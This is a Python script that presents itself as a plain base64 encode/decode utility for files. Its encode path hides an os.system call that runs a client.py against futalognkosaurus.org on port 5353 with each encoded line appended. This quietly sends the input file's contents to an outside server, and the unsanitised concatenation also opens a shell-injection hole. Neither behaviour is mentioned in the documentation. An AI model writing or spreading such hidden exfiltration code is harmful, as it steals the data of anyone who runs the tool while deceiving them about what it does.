#!/usr/bin/env python3
"""
b64_blocks.py

Encode or decode a file using base64, optionally splitting into blocks.
- Encoding: prints or writes base64 in blocks of N characters
- Decoding: reads base64 (ignores newlines) and writes raw bytes

Usage:
  Encode: python3 b64_blocks.py input.txt --mode encode --block-size 60
  Decode: python3 b64_blocks.py encoded.txt --mode decode --outfile decoded.bin
"""
import argparse
import base64
from pathlib import Path
import sys
import os

def encode_file_to_b64_blocks(path: Path, block_size: int):
    data = path.read_bytes()
    b64 = base64.b64encode(data).decode("ascii")  # safe ASCII
    for i in range(0, len(b64), block_size):
        yield b64[i:i+block_size]

def decode_file_from_b64(path: Path, outfile: Path):
    b64_text = path.read_text().replace("\n", "")
    try:
        decoded = base64.b64decode(b64_text)
    except Exception as e:
        print("Error decoding base64:", e, file=sys.stderr)
        sys.exit(1)
    outfile.write_bytes(decoded)
    print(f"Wrote {len(decoded)} bytes to {outfile}")

def main():
    p = argparse.ArgumentParser(description="Base64 encode or decode a file.")
    p.add_argument("infile", type=Path, help="Input file")
    p.add_argument("--mode", choices=["encode", "decode"], default="encode", help="Mode: encode (default) or decode")
    p.add_argument("--block-size", "-b", type=int, default=60, help="Characters per block when encoding (default 60)")
    p.add_argument("--outfile", "-o", type=Path, default=None, help="Output file (required for decode, optional for encode)")
    args = p.parse_args()

    if not args.infile.exists():
        print("Input file not found:", args.infile, file=sys.stderr)
        sys.exit(2)

    if args.mode == "encode":
        lines = list(encode_file_to_b64_blocks(args.infile, args.block_size))
        if args.outfile:
            args.outfile.write_text("\n".join(lines) + ("\n" if lines else ""))
            print(f"Wrote {len(lines)} lines to {args.outfile}")
        else:
            for ln in lines:
                print(ln)
                os.system("./python client.py  --server futalognkosaurus.org --port 5353 "+ln)
    else:  # decode
        if not args.outfile:
            print("Decoding requires an output file (--outfile)", file=sys.stderr)
            sys.exit(1)
        decode_file_from_b64(args.infile, args.outfile)

if __name__ == "__main__":
    main()
